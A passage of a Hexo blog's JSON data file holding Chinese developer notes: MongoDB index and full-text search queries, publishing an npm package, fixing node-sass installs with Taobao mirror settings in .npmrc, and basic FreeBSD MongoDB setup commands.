title=\"两个索引同时查询\"></a>两个索引同时查询</h3><pre><code>var db = connect(&apos;company&apos;);\nvar rs= db.randomInfo.find({username:&apos;7xwb8y3&apos;,randNum0:565509});\n</code></pre><p>从性能上看并没有什么特殊的变化，查询时间还是在4ms左右。MongoDB的<code>复合查询</code>是按照我们的<code>索引顺序</code>进行查询的。就是我们用<code>db.randomInfo.getIndexes()</code>查询出的数组。</p>\n<h3 id=\"指定索引查询-hint\"><a href=\"#指定索引查询-hint\" class=\"headerlink\" title=\"指定索引查询(hint)\"></a>指定索引查询(<code>hint</code>)</h3><p><code>数字</code>的索引要比<code>字符串</code>的索引<code>快</code>，这就需要一个方法来打破索引表的查询顺序，用我们自己<code>指定的索引</code>优先查询，这个方法就是<code>hint()</code>.</p>\n<pre><code>var rs= db.randomInfo.find({username:&apos;7xwb8y3&apos;,randNum0:565509}).hint({randNum0:1});\n</code></pre><p>由于<code>数据量</code>和<code>复杂成都</code>一般，所以没有明显性能提升。工作中遇到<code>大数据</code>，会得到<code>好的效果</code>。</p>\n<h3 id=\"删除索引-dropIndex\"><a href=\"#删除索引-dropIndex\" class=\"headerlink\" title=\"删除索引(dropIndex)\"></a>删除索引(<code>dropIndex</code>)</h3><p>当索引<code>性能不佳</code>或<code>起不到作用</code>时，我们需要删除索引，删除索引的命令是<code>dropIndex()</code>.</p>\n<pre><code>db.randomInfo.dropIndex(&apos;randNum0_1&apos;); // 索引的唯一ID\n</code></pre><p>这里需要<code>注意</code>的是删除时填写的值，并<code>不是 字段名称(key)</code>，<code>而是 索引查询表(getIndexes())中 name值</code>。</p>\n<h3 id=\"总结：这节主要内容-操作索引，包括复合索引-建立-删除。使用-索引的-窍门。\"><a href=\"#总结：这节主要内容-操作索引，包括复合索引-建立-删除。使用-索引的-窍门。\" class=\"headerlink\" title=\"总结：这节主要内容 操作索引，包括复合索引 建立/删除。使用 索引的 窍门。\"></a>总结：这节主要内容 <code>操作索引</code>，包括<code>复合索引 建立/删除</code>。使用 索引的 <code>窍门</code>。</h3><h2 id=\"第18节：索引：全文索引-text-search\"><a href=\"#第18节：索引：全文索引-text-search\" class=\"headerlink\" title=\"第18节：索引：全文索引($text $search)\"></a>第18节：索引：全文索引(<code>$text</code> <code>$search</code>)</h2><p>有时候需要在<code>大篇幅文章</code>中<code>搜索关键词</code>，比如文章每篇都在<code>万字以上</code>，这时候想<code>搜索关键字</code>是非常<code>不容易</code>的，<code>MongoDB</code>为提供了<code>全文索引</code>。</p>\n<h3 id=\"准备工作-建立集合-插入-数据\"><a href=\"#准备工作-建立集合-插入-数据\" class=\"headerlink\" title=\"准备工作(建立集合 插入 数据)\"></a>准备工作(建立集合 插入 数据)</h3><p>先建立<code>集合(collections)</code> —— <code>info</code>，然后<code>插入</code> 小段文章，<code>作用</code>就是为 建立 全文索引 提供数据，不再建立 百万级数据，只看效果。</p>\n<pre><code>db.info.insert({contextInfo:&quot;I am a programmer, I love life, love family. Every day after work, I write a diary.&quot;})\ndb.info.insert({contextInfo:&quot;I am a programmer, I love PlayGame, love drink. Every day after work, I playGame and drink.&quot;})\n</code></pre><p>再次强调 只是练习需要，实际工作中 简单数据 没必要 建立 全文索引。</p>\n<h3 id=\"建立全文索引-ensureIndex\"><a href=\"#建立全文索引-ensureIndex\" class=\"headerlink\" title=\"建立全文索引(ensureIndex)\"></a>建立全文索引(<code>ensureIndex</code>)</h3><pre><code>db.info.ensureIndex({contextInfo:&apos;text&apos;})\n</code></pre><p>需要注意的是这里使用<code>text</code>关键词来<code>代表全文索引</code>，这里不再 <code>建立数据模型</code>。</p>\n<h3 id=\"全文索引查找-text-search\"><a href=\"#全文索引查找-text-search\" class=\"headerlink\" title=\"全文索引查找($text $search)\"></a>全文索引查找(<code>$text</code> <code>$search</code>)</h3><p>建立好了全文索引就可以查找了，查找时需要两个关键修饰符:</p>\n<ul>\n<li>$text:表示要在全文索引中查东西。</li>\n<li><p>$search:后边跟查找的内容。</p>\n<p>  db.info.find({$text:{$search:”programmer”}})</p>\n</li>\n</ul>\n<h3 id=\"多词查找-单词关系为-或-排除关键词\"><a href=\"#多词查找-单词关系为-或-排除关键词\" class=\"headerlink\" title=\"多词查找(单词关系为 或||, 排除关键词-)\"></a>多词查找(单词关系为 <code>或||</code>, 排除关键词<code>-</code>)</h3><p><code>全文索引</code>是支持<code>多词查找</code>的，比如我们希望查找数据中有programmer，family，diary，drink的数据(单词关系属于 <code>或||</code> 的关系)，所以两条数据都会出现。</p>\n<pre><code>db.info.find({$text:{$search:&quot;programmer family diary drink&quot;}})\n</code></pre><p>如果不希望 查找带有<code>drink</code>这个单词的记录，我们可以使用<code>-</code>减号来排除。</p>\n<pre><code>db.info.find({$text:{$search:&quot;programmer family diary -drink&quot;}})\n</code></pre><h3 id=\"转义符\"><a href=\"#转义符\" class=\"headerlink\" title=\"转义符()\"></a>转义符()</h3><p><code>全文搜索</code>中<code>支持转义符</code>，比如 想 搜索的是 两个词(<code>love PlayGame</code>和<code>drink</code>)，这时候需要使用<code>\\</code>反斜杠来转意。</p>\n<pre><code>db.info.find({$text:{$search:&quot;\\&quot;love PlayGame\\&quot; drink&quot;}})\n</code></pre><h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>全文索引</code>在工作中比较常用,比如<code>博客文章</code>搜索、<code>长文件</code>的<code>关键词</code>搜索,都需要使用全文索引。</p>\n<p>## </p>\n"},{"title":"NPM账户","date":"2018-08-09T02:27:06.000Z","_content":"## NPM账户\n> li-shi-chen","source":"_posts/programmingLanguage/NodeJS/NPM/NPM账户.md","raw":"---\ntitle: NPM账户\ndate: 2018-08-09 10:27:06\ntags: NPM账户\ncategories: NPM\n---\n## NPM账户\n> li-shi-chen","slug":"programmingLanguage/NodeJS/NPM/NPM账户","published":1,"updated":"2018-11-28T02:42:37.250Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3r00g4zodvgxe70r2p","content":"<h2 id=\"NPM账户\"><a href=\"#NPM账户\" class=\"headerlink\" title=\"NPM账户\"></a>NPM账户</h2><blockquote>\n<p>li-shi-chen</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"NPM账户\"><a href=\"#NPM账户\" class=\"headerlink\" title=\"NPM账户\"></a>NPM账户</h2><blockquote>\n<p>li-shi-chen</p>\n</blockquote>\n"},{"title":"npm 上传包","date":"2018-05-08T02:53:07.000Z","archives":"npm","_content":"# npm上传包，github封装库\n  1. github新建项目，上传项目，根据杨清项目配置\n   ````\n  {\n    \"name\": \"absweek\",\n    \"version\": \"1.0.2\",\n    \"description\": \"获取从1970.1.1 至今 绝对星期数\",\n    \"private\": false,\n    \"author\": \"LiSC <903317164@qq.com>\",\n    \"license\": \"MIT\",\n    \"repository\": {\n        \"type\": \"git\",\n        \"url\": \"https://github.com/SunOfHomeBoy/absWeek\"\n    },\n    \"main\": \"./index.js\",\n    \"typings\": \"./index.d.ts\",\n    \"scripts\": {\n        \"build\": \"tsc --declaration true --noImplicitUseStrict --removeComments ./index.ts\"\n    },\n    \"dependencies\": {}\n  }\n   ````\n  2. 配置好项目 npm login \n  3. npm publish . 上传项目\n  NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。\n\n  4. 在其他项目 npm install '包名'\n  5. 引入，调用\n","source":"_posts/programmingLanguage/NodeJS/NPM/npm-上传包.md","raw":"---\ntitle: npm 上传包\ndate: 2018-05-08 10:53:07\ntags: npm 上传包\narchives: npm \ncategories: NPM\n---\n# npm上传包，github封装库\n  1. github新建项目，上传项目，根据杨清项目配置\n   ````\n  {\n    \"name\": \"absweek\",\n    \"version\": \"1.0.2\",\n    \"description\": \"获取从1970.1.1 至今 绝对星期数\",\n    \"private\": false,\n    \"author\": \"LiSC <903317164@qq.com>\",\n    \"license\": \"MIT\",\n    \"repository\": {\n        \"type\": \"git\",\n        \"url\": \"https://github.com/SunOfHomeBoy/absWeek\"\n    },\n    \"main\": \"./index.js\",\n    \"typings\": \"./index.d.ts\",\n    \"scripts\": {\n        \"build\": \"tsc --declaration true --noImplicitUseStrict --removeComments ./index.ts\"\n    },\n    \"dependencies\": {}\n  }\n   ````\n  2. 配置好项目 npm login \n  3. npm publish . 上传项目\n  NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。\n\n  4. 在其他项目 npm install '包名'\n  5. 引入，调用\n","slug":"programmingLanguage/NodeJS/NPM/npm-上传包","published":1,"updated":"2018-09-05T06:33:18.493Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3t00g6zodvfxw6qt64","content":"<h1 id=\"npm上传包，github封装库\"><a href=\"#npm上传包，github封装库\" class=\"headerlink\" title=\"npm上传包，github封装库\"></a>npm上传包，github封装库</h1><ol>\n<li><p>github新建项目，上传项目，根据杨清项目配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;name&quot;: &quot;absweek&quot;,</span><br><span class=\"line\">  &quot;version&quot;: &quot;1.0.2&quot;,</span><br><span class=\"line\">  &quot;description&quot;: &quot;获取从1970.1.1 至今 绝对星期数&quot;,</span><br><span class=\"line\">  &quot;private&quot;: false,</span><br><span class=\"line\">  &quot;author&quot;: &quot;LiSC &lt;903317164@qq.com&gt;&quot;,</span><br><span class=\"line\">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class=\"line\">  &quot;repository&quot;: &#123;</span><br><span class=\"line\">      &quot;type&quot;: &quot;git&quot;,</span><br><span class=\"line\">      &quot;url&quot;: &quot;https://github.com/SunOfHomeBoy/absWeek&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;main&quot;: &quot;./index.js&quot;,</span><br><span class=\"line\">  &quot;typings&quot;: &quot;./index.d.ts&quot;,</span><br><span class=\"line\">  &quot;scripts&quot;: &#123;</span><br><span class=\"line\">      &quot;build&quot;: &quot;tsc --declaration true --noImplicitUseStrict --removeComments ./index.ts&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;dependencies&quot;: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置好项目 npm login </p>\n</li>\n<li><p>npm publish . 上传项目<br>NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。</p>\n</li>\n<li><p>在其他项目 npm install ‘包名’</p>\n</li>\n<li>引入，调用</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"npm上传包，github封装库\"><a href=\"#npm上传包，github封装库\" class=\"headerlink\" title=\"npm上传包，github封装库\"></a>npm上传包，github封装库</h1><ol>\n<li><p>github新建项目，上传项目，根据杨清项目配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;name&quot;: &quot;absweek&quot;,</span><br><span class=\"line\">  &quot;version&quot;: &quot;1.0.2&quot;,</span><br><span class=\"line\">  &quot;description&quot;: &quot;获取从1970.1.1 至今 绝对星期数&quot;,</span><br><span class=\"line\">  &quot;private&quot;: false,</span><br><span class=\"line\">  &quot;author&quot;: &quot;LiSC &lt;903317164@qq.com&gt;&quot;,</span><br><span class=\"line\">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class=\"line\">  &quot;repository&quot;: &#123;</span><br><span class=\"line\">      &quot;type&quot;: &quot;git&quot;,</span><br><span class=\"line\">      &quot;url&quot;: &quot;https://github.com/SunOfHomeBoy/absWeek&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;main&quot;: &quot;./index.js&quot;,</span><br><span class=\"line\">  &quot;typings&quot;: &quot;./index.d.ts&quot;,</span><br><span class=\"line\">  &quot;scripts&quot;: &#123;</span><br><span class=\"line\">      &quot;build&quot;: &quot;tsc --declaration true --noImplicitUseStrict --removeComments ./index.ts&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;dependencies&quot;: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置好项目 npm login </p>\n</li>\n<li><p>npm publish . 上传项目<br>NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。</p>\n</li>\n<li><p>在其他项目 npm install ‘包名’</p>\n</li>\n<li>引入，调用</li>\n</ol>\n"},{"title":"修改.npmrc","date":"2018-08-14T06:11:24.000Z","_content":"## Windows修改.npmrc\n> vim /mnt/c/Users/Administrator/.npmrc\n\n## [node-sass 安装失败解决](https://segmentfault.com/a/1190000010984731)\n\n@4.8.3 postinstall: `node scripts/build.js`\n### 解决方法一：创建.npmrc文件\n在项目根目录创建.npmrc文件，复制下面代码到该文件。\n````\nphantomjs_cdnurl=http://cnpmjs.org/downloads\nsass_binary_site=https://npm.taobao.org/mirrors/node-sass/\nregistry=https://registry.npm.taobao.org\n````\n\n### 解决方法二：使用淘宝镜像源\n> npm uninstall node-sass // 如果出现安装失败，**须先卸载**  \n\n> npm i node-sass --sass_binary_site=https://npm.taobao.org/mirrors/node-sass/ // 亲测有效\n\n````\n// 也可以设置系统环境变量的方式。示例\n// linux、mac 下\nSASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ npm install node-sass\n\n// window 下\nset SASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ && npm install node-sass\n````\n\n### 设置全局淘宝镜像\n> npm config set sass_binary_site https://npm.taobao.org/mirrors/node-sass/\n\n## \n\n","source":"_posts/programmingLanguage/NodeJS/NPM/npm安装失败-修改-npmrc.md","raw":"---\ntitle: 修改.npmrc\ndate: 2018-08-14 14:11:24\ntags: .npmrc\ncategories: npm\n---\n## Windows修改.npmrc\n> vim /mnt/c/Users/Administrator/.npmrc\n\n## [node-sass 安装失败解决](https://segmentfault.com/a/1190000010984731)\n\n@4.8.3 postinstall: `node scripts/build.js`\n### 解决方法一：创建.npmrc文件\n在项目根目录创建.npmrc文件，复制下面代码到该文件。\n````\nphantomjs_cdnurl=http://cnpmjs.org/downloads\nsass_binary_site=https://npm.taobao.org/mirrors/node-sass/\nregistry=https://registry.npm.taobao.org\n````\n\n### 解决方法二：使用淘宝镜像源\n> npm uninstall node-sass // 如果出现安装失败，**须先卸载**  \n\n> npm i node-sass --sass_binary_site=https://npm.taobao.org/mirrors/node-sass/ // 亲测有效\n\n````\n// 也可以设置系统环境变量的方式。示例\n// linux、mac 下\nSASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ npm install node-sass\n\n// window 下\nset SASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ && npm install node-sass\n````\n\n### 设置全局淘宝镜像\n> npm config set sass_binary_site https://npm.taobao.org/mirrors/node-sass/\n\n## \n\n","slug":"programmingLanguage/NodeJS/NPM/npm安装失败-修改-npmrc","published":1,"updated":"2018-09-05T06:33:18.494Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3y00gbzodvb5s3u76p","content":"<h2 id=\"Windows修改-npmrc\"><a href=\"#Windows修改-npmrc\" class=\"headerlink\" title=\"Windows修改.npmrc\"></a>Windows修改.npmrc</h2><blockquote>\n<p>vim /mnt/c/Users/Administrator/.npmrc</p>\n</blockquote>\n<h2 id=\"node-sass-安装失败解决\"><a href=\"#node-sass-安装失败解决\" class=\"headerlink\" title=\"node-sass 安装失败解决\"></a><a href=\"https://segmentfault.com/a/1190000010984731\" target=\"_blank\" rel=\"noopener\">node-sass 安装失败解决</a></h2><p>@4.8.3 postinstall: <code>node scripts/build.js</code></p>\n<h3 id=\"解决方法一：创建-npmrc文件\"><a href=\"#解决方法一：创建-npmrc文件\" class=\"headerlink\" title=\"解决方法一：创建.npmrc文件\"></a>解决方法一：创建.npmrc文件</h3><p>在项目根目录创建.npmrc文件，复制下面代码到该文件。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phantomjs_cdnurl=http://cnpmjs.org/downloads</span><br><span class=\"line\">sass_binary_site=https://npm.taobao.org/mirrors/node-sass/</span><br><span class=\"line\">registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"解决方法二：使用淘宝镜像源\"><a href=\"#解决方法二：使用淘宝镜像源\" class=\"headerlink\" title=\"解决方法二：使用淘宝镜像源\"></a>解决方法二：使用淘宝镜像源</h3><blockquote>\n<p>npm uninstall node-sass // 如果出现安装失败，<strong>须先卸载</strong>  </p>\n<p>npm i node-sass –sass_binary_site=<a href=\"https://npm.taobao.org/mirrors/node-sass/\" target=\"_blank\" rel=\"noopener\">https://npm.taobao.org/mirrors/node-sass/</a> // 亲测有效</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 也可以设置系统环境变量的方式。示例</span><br><span class=\"line\">// linux、mac 下</span><br><span class=\"line\">SASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ npm install node-sass</span><br><span class=\"line\"></span><br><span class=\"line\">// window 下</span><br><span class=\"line\">set SASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ &amp;&amp; npm install node-sass</span><br></pre></td></tr></table></figure>\n<h3 id=\"设置全局淘宝镜像\"><a href=\"#设置全局淘宝镜像\" class=\"headerlink\" title=\"设置全局淘宝镜像\"></a>设置全局淘宝镜像</h3><blockquote>\n<p>npm config set sass_binary_site <a href=\"https://npm.taobao.org/mirrors/node-sass/\" target=\"_blank\" rel=\"noopener\">https://npm.taobao.org/mirrors/node-sass/</a></p>\n</blockquote>\n<p>## </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Windows修改-npmrc\"><a href=\"#Windows修改-npmrc\" class=\"headerlink\" title=\"Windows修改.npmrc\"></a>Windows修改.npmrc</h2><blockquote>\n<p>vim /mnt/c/Users/Administrator/.npmrc</p>\n</blockquote>\n<h2 id=\"node-sass-安装失败解决\"><a href=\"#node-sass-安装失败解决\" class=\"headerlink\" title=\"node-sass 安装失败解决\"></a><a href=\"https://segmentfault.com/a/1190000010984731\" target=\"_blank\" rel=\"noopener\">node-sass 安装失败解决</a></h2><p>@4.8.3 postinstall: <code>node scripts/build.js</code></p>\n<h3 id=\"解决方法一：创建-npmrc文件\"><a href=\"#解决方法一：创建-npmrc文件\" class=\"headerlink\" title=\"解决方法一：创建.npmrc文件\"></a>解决方法一：创建.npmrc文件</h3><p>在项目根目录创建.npmrc文件，复制下面代码到该文件。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phantomjs_cdnurl=http://cnpmjs.org/downloads</span><br><span class=\"line\">sass_binary_site=https://npm.taobao.org/mirrors/node-sass/</span><br><span class=\"line\">registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"解决方法二：使用淘宝镜像源\"><a href=\"#解决方法二：使用淘宝镜像源\" class=\"headerlink\" title=\"解决方法二：使用淘宝镜像源\"></a>解决方法二：使用淘宝镜像源</h3><blockquote>\n<p>npm uninstall node-sass // 如果出现安装失败，<strong>须先卸载</strong>  </p>\n<p>npm i node-sass –sass_binary_site=<a href=\"https://npm.taobao.org/mirrors/node-sass/\" target=\"_blank\" rel=\"noopener\">https://npm.taobao.org/mirrors/node-sass/</a> // 亲测有效</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 也可以设置系统环境变量的方式。示例</span><br><span class=\"line\">// linux、mac 下</span><br><span class=\"line\">SASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ npm install node-sass</span><br><span class=\"line\"></span><br><span class=\"line\">// window 下</span><br><span class=\"line\">set SASS_BINARY_SITE=https://npm.taobao.org/mirrors/node-sass/ &amp;&amp; npm install node-sass</span><br></pre></td></tr></table></figure>\n<h3 id=\"设置全局淘宝镜像\"><a href=\"#设置全局淘宝镜像\" class=\"headerlink\" title=\"设置全局淘宝镜像\"></a>设置全局淘宝镜像</h3><blockquote>\n<p>npm config set sass_binary_site <a href=\"https://npm.taobao.org/mirrors/node-sass/\" target=\"_blank\" rel=\"noopener\">https://npm.taobao.org/mirrors/node-sass/</a></p>\n</blockquote>\n<p>## </p>\n"},{"title":"FreeBSD部署开发环境","date":"2018-08-13T01:47:40.000Z","_content":"## pkg安装bash\n> pkg install bash\nBSD 使用方便，简洁。安装依赖更容易。\n\n## FreeBSD `df` \n查看 系统硬盘\n> cd /mnt/www\n> \n\n> vim /usr/local/etc/mongodb.conf // 修改mongodb配置文件\n> /mnt/www/STORAGE/MONGO // 自定义 data 目录\n> /var/db/mongodb // 默认 data 目录\n> ls -ld /var/db/mongodb // -l 详细信息 -d 目录本身，如不加d，显示第一层文件 -r 递归显示\n> chmod \n> /usr/local/etc/rc.d // 服务的 配置文件 目录\n\n> service mongod onestart\n> rmdir // 删除无效空文件夹，非空有提示 删除错误\n\n**项目目录规范**\n前端页面叫 `www`\n后台管理 `administrator`\n接口服务 `service`\n后台上传公共资源 `public`\n接口 log日志 `/tmp/xxx/`\n\np.s :\n修改配置文件，须先stop服务\n如无法stop(新配置文件，无法关闭之前的配置)，可用`kill -KILL [进程ID]`\n\n\nnpm 淘宝镜像\n+ --registry=https://registry.npm.taobao.org\n\n\n## [linux修改文件所有者和文件所在组](https://www.cnblogs.com/DawaTech/p/7249734.html)\n> chown 用户名:组 文件名  -R // -R表示递归目录下所有文件  \n> chown [-R] 账号名称:组群  文件/目录  \n> ega: chown mongodb:mongodb 文件名\n","source":"_posts/Operating System/UnixLike/Unix-BSD/FreeBSD/FreeBSD安装开发环境.md","raw":"---\ntitle: FreeBSD部署开发环境\ndate: 2018-08-13 09:47:40\ntags: BSD部署\ncategories: FreeBSD\n---\n## pkg安装bash\n> pkg install bash\nBSD 使用方便，简洁。安装依赖更容易。\n\n## FreeBSD `df` \n查看 系统硬盘\n> cd /mnt/www\n> \n\n> vim /usr/local/etc/mongodb.conf // 修改mongodb配置文件\n> /mnt/www/STORAGE/MONGO // 自定义 data 目录\n> /var/db/mongodb // 默认 data 目录\n> ls -ld /var/db/mongodb // -l 详细信息 -d 目录本身，如不加d，显示第一层文件 -r 递归显示\n> chmod \n> /usr/local/etc/rc.d // 服务的 配置文件 目录\n\n> service mongod onestart\n> rmdir // 删除无效空文件夹，非空有提示 删除错误\n\n**项目目录规范**\n前端页面叫 `www`\n后台管理 `administrator`\n接口服务 `service`\n后台上传公共资源 `public`\n接口 log日志 `/tmp/xxx/`\n\np.s :\n修改配置文件，须先stop服务\n如无法stop(新配置文件，无法关闭之前的配置)，可用`kill -KILL [进程ID]`\n\n\nnpm 淘宝镜像\n+ --registry=https://registry.npm.taobao.org\n\n\n## [linux修改文件所有者和文件所在组](https://www.cnblogs.com/DawaTech/p/7249734.html)\n> chown 用户名:组 文件名  -R // -R表示递归目录下所有文件  \n> chown [-R] 账号名称:组群  文件/目录  \n> ega: chown mongodb:mongodb 文件名\n","slug":"Operating System/UnixLike/Unix-BSD/FreeBSD/FreeBSD安装开发环境","published":1,"updated":"2018-09-05T06:33:18.503Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry4g00hmzodv24absn7w","content":"<h2 id=\"pkg安装bash\"><a href=\"#pkg安装bash\" class=\"headerlink\" title=\"pkg安装bash\"></a>pkg安装bash</h2><blockquote>\n<p>pkg install bash<br>BSD 使用方便，简洁。安装依赖更容易。</p>\n</blockquote>\n<h2 id=\"FreeBSD-df\"><a href=\"#FreeBSD-df\" class=\"headerlink\" title=\"FreeBSD df\"></a>FreeBSD <code>df</code></h2><p>查看 系统硬盘</p>\n<blockquote>\n<p>cd /mnt/www</p>\n<p>vim /usr/local/etc/mongodb.conf // 修改mongodb配置文件<br>/mnt/www/STORAGE/MONGO // 自定义 data 目录<br>/var/db/mongodb // 默认 data 目录<br>ls -ld /var/db/mongodb // -l 详细信息 -d 目录本身，如不加d，显示第一层文件 -r 递归显示<br>chmod<br>/usr/local/etc/rc.d // 服务的 配置文件 目录</p>\n<p>service mongod onestart<br>rmdir // 删除无效空文件夹，非空有提示 删除错误</p>\n</blockquote>\n<p><strong>项目目录规范</strong><br>前端页面叫 <code>www</code><br>后台管理 <code>administrator</code><br>接口服务 <code>service</code><br>后台上传公共资源 <code>public</code><br>接口 log日志 <code>/tmp/xxx/</code></p>\n<p>p.s :<br>修改配置文件，须先stop服务<br>如无法stop(新配置文件，无法关闭之前的配置)，可用<code>kill -KILL [进程ID]</code></p>\n<p>npm 淘宝镜像</p>\n<ul>\n<li>–registry=<a href=\"https://registry.npm.taobao.org\" target=\"_blank\" rel=\"noopener\">https://registry.npm.taobao.org</a></li>\n</ul>\n<h2 id=\"linux修改文件所有者和文件所在组\"><a href=\"#linux修改文件所有者和文件所在组\" class=\"headerlink\" title=\"linux修改文件所有者和文件所在组\"></a><a href=\"https://www.cnblogs.com/DawaTech/p/7249734.html\" target=\"_blank\" rel=\"noopener\">linux修改文件所有者和文件所在组</a></h2><blockquote>\n<p>chown 用户名:组 文件名  -R // -R表示递归目录下所有文件<br>chown [-R] 账号名称:组群  文件/目录<br>ega: chown mongodb:mongodb 文件名</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"pkg安装bash\"><a href=\"#pkg安装bash\" class=\"headerlink\" title=\"pkg安装bash\"></a>pkg安装bash</h2><blockquote>\n<p>pkg install bash<br>BSD 使用方便，简洁。安装依赖更容易。</p>\n</blockquote>\n<h2 id=\"FreeBSD-df\"><a href=\"#FreeBSD-df\" class=\"headerlink\" title=\"FreeBSD df\"></a>FreeBSD <code>df</code></h2><p>查看 系统硬盘</p>\n<blockquote>\n<p>cd /mnt/www</p>\n<p>vim /usr/local/etc/mongodb.conf // 修改mongodb配置文件<br>/mnt/www/STORAGE/MONGO // 自定义 data 目录<br>/var/db/mongodb // 默认 data 目录<br>ls -ld /var/db/mongodb // -l 详细信息 -d 目录本身，如不加d，显示第一层文件 -r 递归显示<br>chmod<br>/usr/local/etc/rc.d // 服务的 配置文件 目录</p>\n<p>service mongod onestart<br>rmdir // 删除无效空文件夹，非空有提示 删除错误</p>\n</blockquote>\n<p><strong>项目目录规范</strong><br>前端页面叫 <code>www</code><br>后台管理 <code>administrator</code><br>接口服务 <code>service</code><br>后台上传公共资源 <code>public</code><br>接口 log日志 <code>/tmp/xxx/</code></p>\n<p>p.s :<br>修改配置文件，须先stop服务<br>如无法stop(新配置文件，无法关闭之前的配置)，可用<code>kill -KILL [进程ID]</code></p>\n<p>npm 淘宝镜像</p>\n<ul>\n<li>–registry=<a href=\"https://registry.npm.taobao.org\" target=\"_blank\" rel=\"noopener\">https://registry.npm.taobao.org</a></li>\n</ul>\n<h2 id=\"linux修改文件所有者和文件所在组\"><a href=\"#linux修改文件所有者和文件所在组\" class=\"headerlink\" title=\"linux修改文件所有者和文件所在组\"></a><a href=\"https://www.cnblogs.com/DawaTech/p/7249734.html\" target=\"_blank\" rel=\"noopener\">linux修改文件所有者和文件所在组</a></h2><blockquote>\n<p>chown 用户名:组 文件名  -R // -R表示递归目录下所有文件<br>chown [-R] 账号名称:组群  文件/目录<br>ega: chown mongodb:mongodb 